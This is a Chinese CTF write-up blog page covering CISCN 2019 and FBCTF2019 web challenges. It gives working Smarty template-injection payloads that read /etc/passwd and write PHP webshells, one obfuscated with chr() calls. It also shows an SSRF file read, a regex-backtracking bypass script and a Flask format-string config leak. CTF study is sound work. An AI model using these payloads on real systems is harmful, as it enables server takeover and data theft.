@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
+
+
+
+
+
+
+<meta name="description" content="ciscn 华东南 web11https://www.freebuf.com/column/219913.html 题目是一个模拟获取ip的程序，在源码的最下面写着 1Build With Smarty !  Smarty是PHP的一个模板，想到SSTI 添加一个X-Forwarded-For的请求头  {1+1}  返回ip为2  存在SSTI Smarty执行php代码的几种方式 1234&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUU_two">
+<meta property="og:url" content="http://yoursite.com/2019/11/24/BUU-two/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ciscn 华东南 web11https://www.freebuf.com/column/219913.html 题目是一个模拟获取ip的程序，在源码的最下面写着 1Build With Smarty !  Smarty是PHP的一个模板，想到SSTI 添加一个X-Forwarded-For的请求头  {1+1}  返回ip为2  存在SSTI Smarty执行php代码的几种方式 1234&amp;#">
+<meta property="og:locale" content="zh">
+<meta property="og:updated_time" content="2019-12-04T14:13:06.516Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BUU_two">
+<meta name="twitter:description" content="ciscn 华东南 web11https://www.freebuf.com/column/219913.html 题目是一个模拟获取ip的程序，在源码的最下面写着 1Build With Smarty !  Smarty是PHP的一个模板，想到SSTI 添加一个X-Forwarded-For的请求头  {1+1}  返回ip为2  存在SSTI Smarty执行php代码的几种方式 1234&amp;#">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/24/BUU-two/">
+
+
+
+
+
+  <title>BUU_two | Hexo</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/24/BUU-two/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BUU_two</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-24T16:00:09+08:00">
+                2019-11-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="ciscn-华东南-web11"><a href="#ciscn-华东南-web11" class="headerlink" title="ciscn 华东南 web11"></a>ciscn 华东南 web11</h2><p><a href="https://www.freebuf.com/column/219913.html" target="_blank" rel="noopener">https://www.freebuf.com/column/219913.html</a></p>
+<p>题目是一个模拟获取ip的程序，在源码的最下面写着</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Build With Smarty !</span><br></pre></td></tr></table></figure>
+
+<p>Smarty是PHP的一个模板，想到SSTI</p>
+<p>添加一个X-Forwarded-For的请求头 </p>
+<p>{1+1}  返回ip为2  存在SSTI</p>
+<p>Smarty执行php代码的几种方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;$data&#125; //解析变量</span><br><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125; 解析php代码 大部分cms都会禁止掉这个标签</span><br><span class="line">&#123;123|md5&#125; //把123md5加密</span><br><span class="line">&#123;:phpinfo()&#125; //这种也是直接执行代码</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取版本号"><a href="#获取版本号" class="headerlink" title="获取版本号"></a>获取版本号</h3><p>{$smarty.version}   返回 3.1.30    </p>
+<h3 id="针对本题的payload"><a href="#针对本题的payload" class="headerlink" title="针对本题的payload"></a>针对本题的payload</h3><p>{if code}{/if}</p>
+<p>{if phpinfo()}{/if}  执行了phpinfo</p>
+<p>列文件  <code>{if print_r(scandir(&quot;/&quot;))}{/if}</code></p>
+<p>获取flag  <code>{if show_source(&#39;/flag&#39;)}{/if}</code></p>
+<p>题目的漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./smarty/libs/'</span> . <span class="string">'Smarty.class.php'</span>);</span><br><span class="line">$smarty = <span class="keyword">new</span> Smarty();</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">$smarty-&gt;display(<span class="string">"string:"</span>.$ip);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他的几种payload"><a href="#其他的几种payload" class="headerlink" title="其他的几种payload"></a>其他的几种payload</h3><h4 id="php标签"><a href="#php标签" class="headerlink" title="php标签"></a>php标签</h4><p>{php}{/php}</p>
+<p>Smarty官方手册中描述</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smarty已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用。</span><br></pre></td></tr></table></figure>
+
+<p>本题中使用的是Smarty类  这种方法不适用</p>
+<h4 id="literal-标签"><a href="#literal-标签" class="headerlink" title="literal 标签"></a>literal 标签</h4><p>{literal}{/literal}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;literal&#125;可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</span><br></pre></td></tr></table></figure>
+
+<p>对于php5的环境 可以适用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>通过self获取Smarty类再调用其静态方法实现文件读写</p>
+<p>Smarty类的getStreamVariable方法的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span><span class="params">($variable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $_result = <span class="string">''</span>;</span><br><span class="line">        $fp = fopen($variable, <span class="string">'r+'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($fp) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                $_result .= $current_line;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose($fp);</span><br><span class="line">            <span class="keyword">return</span> $_result;</span><br><span class="line">        &#125;</span><br><span class="line">        $smarty = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;smarty) ? <span class="keyword">$this</span>-&gt;smarty : <span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">if</span> ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">'Undefined stream variable "'</span> . $variable . <span class="string">'"'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br><span class="line">该方法适用3.1.30版本以下的 新版里面把这些类 给删掉了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&apos;cmd&apos;]); ?&gt;&quot;,self::clearConfig())&#125;  写shell</span><br></pre></td></tr></table></figure>
+
+<h4 id="assgin"><a href="#assgin" class="headerlink" title="assgin"></a>assgin</h4><p>assign自定义变量格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;assign var=&quot;变量名&quot; value=&quot;值&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一般来说很多调用模板的cms都不会使用默认标签{} 一般都会改成&lt;{}&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#123;assign var=&#123;$&#123;fputs(fopen(chr(120).chr(46).chr(112).chr(104).chr(112),chr(119)),chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(64).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(79).chr(39).chr(93).chr(41).chr(59).chr(63).chr(62))&#125;&#125; value=x&#125;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ciscn-华东南-web4"><a href="#ciscn-华东南-web4" class="headerlink" title="ciscn 华东南 web4"></a>ciscn 华东南 web4</h2><p>用file协议提示hack  去掉file 直接用文件名  试了一下main.py run.py不对 app.py对了</p>
+<p>?url=/proc/self/cwd/app.py  拿到源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! &lt;a href="/read?url=https://baidu.com"&gt;Read somethings&lt;/a&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/read')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line">        m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'No Hack'</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="keyword">print</span> str(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'no response'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>:</span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">"0.0.0.0"</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>很明显的伪造session</p>
+<p>获取mac地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/sys/class/net/eth0/address</span><br><span class="line">02:42:ae:00:00:a1</span><br></pre></td></tr></table></figure>
+
+<p>题目很玄学，得用py2 + linux的环境 但是我用了 也不行 </p>
+<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>flask的ssti  不过需要rc4加密一下</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web54.buuoj.cn/secret?secret=%2e%14%19%12%c3%ad%49%34%51%68%c2%91%c3%99%00%c2%ad%c2%8d%c3%89%c3%a6%0b%c2%ac%59%26%c2%b8%6d%c3%9f%49%58%c2%ac%76%c2%b6%6d%c3%9f%27%c3%a5%2e%c2%87%4c%c3%85%1b%c3%b4%3b%c3%9b%44%c2%92%c3%84%c3%99%39%5e%c2%80%52%c3%a7%c3%b2%40%60%63%c3%ac%64%78%c2%8f%2b%0a%c2%8d%c3%b7%58%14%c3%b4%c2%90%51%c3%b3%09%27%59</span><br></pre></td></tr></table></figure>
+
+<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>正则回溯限制</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'&#123;"cmd":"/bin/cat /home/rceservice/flag","zz":"'</span> + <span class="string">"a"</span>*(<span class="number">1000000</span>) + <span class="string">'"&#125;'</span></span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">"http://4b9edac9-2f65-4238-9f0b-a91d897a988e.node3.buuoj.cn/"</span>, data=&#123;<span class="string">"cmd"</span>:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里限制了环境 putenv(‘PATH=/home/rceservice/jail’);  使用其他命令 只能用文件的形式</p>
+<p>/bin/cat </p>
+<p>Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p>
+<h2 id="FBCTF2019-Event"><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h2><p>admin/admin登陆不上 test/test登上了 貌似应该是要伪造成admin，就可以拿到flag</p>
+<p>看cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=InRlc3Qi.XdyNmw.a_Et25s-LPiwIJztaB3UqwXHtwA; events_sesh_cookie=.eJwlzj0OwyAMQOG7eM5gMGCTy0T4B6Vr0kxV716kDm_99D5wzCvuE_b39cQGx8thh5zZnSzQZeBobrXPabiajatRVsZZPJmKRuohNoO1UYwqPa8iCVMUK7URohc0rll8tiiDlckdU-0YmLArL1QkZVKiRRYpsMFzx_WfSfD9Af34Lxg.XdyNmw.xOLyiO0F9NExpAyME5iTarKTRcc</span><br></pre></td></tr></table></figure>
+
+<p>第二个有点像jwt 第一个还不知道是啥东西 但是可以看的出来应该是经过加密的 </p>
+<p>所以现在要拿到密钥 </p>
+<p>这里有三个参数 </p>
+<p>event_name</p>
+<p>event_address</p>
+<p>event_important</p>
+<p><strong>no.1</strong> 当时想会不会是sql注入，拿到数据库里的密钥  如果是注入的话 应该是insert型的注入，</p>
+<p><strong>no.2</strong> 或者是管理员看到了 我们提交的 event 获取到管理员的cookie  xss盲打 这里没有说管理员会去看我们提交的东西</p>
+<p><strong>no.3</strong> 这个网站是用flask写的 会不会存在ssti</p>
+<p>用dict看一下 包含哪些东西</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'_sa_instance_state'</span>: &lt;sqlalchemy.orm.state.InstanceState object at <span class="number">0x7ff2c62a87d0</span>&gt;, <span class="string">'address'</span>: <span class="string">'s'</span>, <span class="string">'id'</span>: <span class="number">2</span>, <span class="string">'owner_id'</span>: <span class="number">1</span>, <span class="string">'show'</span>: <span class="string">'__dict__'</span>, <span class="string">'name'</span>: <span class="string">'s'</span>, <span class="string">'fmt'</span>: <span class="string">'&#123;0.__dict__&#125;'</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个应该是一个数据库对象<code>sqlalchemy.orm.state.InstanceState object</code>  里面存放的是name address 还有个show对应的就是event_important </p>
+<p><strong>_sa_instance_state参数</strong>   SQLAlchemy 在对象的 <code>__dict__</code> 中维护对象的状态。它往 <code>__dict__</code> 中加入对象的状态 <code>_sa_instance_state</code>，通过这个值来跟踪对象。主要是为了缓存</p>
+<p>这里还有个fmt </p>
+<p>python的format方法只能进行属性的访问，不能进行方法的调用</p>
+<p>这里一直没看明白 去找源码看了一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Event</span><span class="params">(db.Model, object)</span>:</span></span><br><span class="line">   id = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">   name = db.Column(db.String(<span class="number">100</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">   address = db.Column(db.String(<span class="number">100</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">   show = db.Column(db.String(<span class="number">200</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">   owner_id = db.Column(db.Integer, db.ForeignKey(<span class="string">"user.id"</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">   fmt = db.Column(db.String(<span class="number">300</span>), nullable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   。。。</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> event_name <span class="keyword">and</span> event_address <span class="keyword">and</span> event_important:</span><br><span class="line">           fmt = <span class="string">"&#123;0.%s&#125;"</span> % event_important</span><br><span class="line"></span><br><span class="line">           e = Event(</span><br><span class="line">               name=event_name,</span><br><span class="line">               address=event_address,</span><br><span class="line">               show=event_important,</span><br><span class="line">               fmt=fmt,</span><br><span class="line">               owner_id=current_user.id,</span><br><span class="line">           )</span><br><span class="line"></span><br><span class="line">           <span class="keyword">try</span>:</span><br><span class="line">               e.fmt.format(e)</span><br></pre></td></tr></table></figure>
+
+<p>当传入<code>__dict__</code>   e.fmt.format(e)的值 就是<code>{Event.__dict__}</code>  在format的时候，会自动的去获取Event的属性也就是_<em>dict_</em>  </p>
+<p>我的测试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>event=<span class="string">'__dict__'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fmt = <span class="string">"&#123;0.%s&#125;"</span> % event</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fmt</span><br><span class="line"><span class="string">'&#123;0.__dict__&#125;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fmt.format(s)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">'int'</span> object has no attribute <span class="string">'__dict__'</span></span><br></pre></td></tr></table></figure>
+
+<p>globals之后的结果是一个字典，获取字典中的元素要用dict[key] 这里也是没有搞清楚 为什么key两端不加引号</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event_name=%7B%7B1%2B1%7D%7D&amp;event_address=%7B%7B1%2B2%7D%7D&amp;event_important=__class__.__init__.__globals__[app].config</span><br></pre></td></tr></table></figure>
+
+<p>拿到密钥</p>
